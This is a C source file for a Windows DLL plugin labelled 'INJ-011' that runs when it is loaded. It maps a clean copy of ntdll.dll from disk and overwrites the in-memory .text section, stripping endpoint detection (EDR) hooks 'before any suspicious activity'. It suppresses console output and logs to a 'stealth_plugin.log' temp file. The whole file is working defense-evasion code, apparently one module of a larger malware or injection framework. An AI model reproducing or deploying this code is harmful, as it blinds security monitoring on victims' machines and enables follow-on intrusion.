// INJ-011: NTDLL Unhooking Plugin
// Removes EDR hooks from ntdll.dll by restoring original bytes from disk
// Target stage: PRELAUNCH (unhook before any suspicious activity)

#include <windows.h>
#include <stdio.h>

#ifndef ALLOW_CONSOLE_PRINTS
#define printf(...) ((void)0)
#define fprintf(...) ((void)0)
#define puts(...) ((void)0)
#define putchar(...) ((void)0)
#define perror(...) ((void)0)
#endif

static void write_plugin_log(const char *msg) {
    char tmp[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, tmp)) return;
    char path[MAX_PATH];
    snprintf(path, MAX_PATH, "%sstealth_plugin.log", tmp);
    FILE *fp = fopen(path, "a");
    if (fp) {
        fprintf(fp, "[INJ-011] %s\n", msg);
        fclose(fp);
    }
}

static void unhook_ntdll(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        write_plugin_log("Failed to get ntdll.dll handle");
        return;
    }
    
    char logbuf[256];
    snprintf(logbuf, sizeof(logbuf), "NTDLL base address: 0x%p", (void*)hNtdll);
    write_plugin_log(logbuf);
    
    // Get ntdll path
    char ntdllPath[MAX_PATH];
    if (!GetModuleFileNameA(hNtdll, ntdllPath, MAX_PATH)) {
        write_plugin_log("Failed to get ntdll.dll path");
        return;
    }
    
    // Open ntdll from disk
    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        write_plugin_log("Failed to open ntdll.dll from disk");
        return;
    }
    
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        write_plugin_log("Failed to create file mapping");
        return;
    }
    
    LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        write_plugin_log("Failed to map view of file");
        return;
    }
    
    write_plugin_log("Mapped clean ntdll.dll from disk");
    
    // Parse PE headers to find .text section
    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDosHdr->e_lfanew);
    
    for (WORD i = 0; i < pNtHdrs->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSectionHdr = (PIMAGE_SECTION_HEADER)(
            (BYTE*)&pNtHdrs->OptionalHeader + 
            pNtHdrs->FileHeader.SizeOfOptionalHeader + 
            (i * sizeof(IMAGE_SECTION_HEADER))
        );
        
        if (memcmp(pSectionHdr->Name, ".text", 5) == 0) {
            LPVOID pLocalTxt = (LPVOID)((BYTE*)hNtdll + pSectionHdr->VirtualAddress);
            LPVOID pRemoteTxt = (LPVOID)((BYTE*)pMapping + pSectionHdr->VirtualAddress);
            SIZE_T txtSize = pSectionHdr->Misc.VirtualSize;
            
            // Change protection to RWX
            DWORD oldProtect = 0;
            if (!VirtualProtect(pLocalTxt, txtSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                write_plugin_log("Failed to change .text protection");
                break;
            }
            
            // Copy clean .text section
            memcpy(pLocalTxt, pRemoteTxt, txtSize);
            
            // Restore protection
            VirtualProtect(pLocalTxt, txtSize, oldProtect, &oldProtect);
            
            snprintf(logbuf, sizeof(logbuf), "Restored .text section (%zu bytes)", txtSize);
            write_plugin_log(logbuf);
            break;
        }
    }
    
    UnmapViewOfFile(pMapping);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    
    write_plugin_log("NTDLL unhooking completed");
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        write_plugin_log("Plugin loaded");
        unhook_ntdll();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
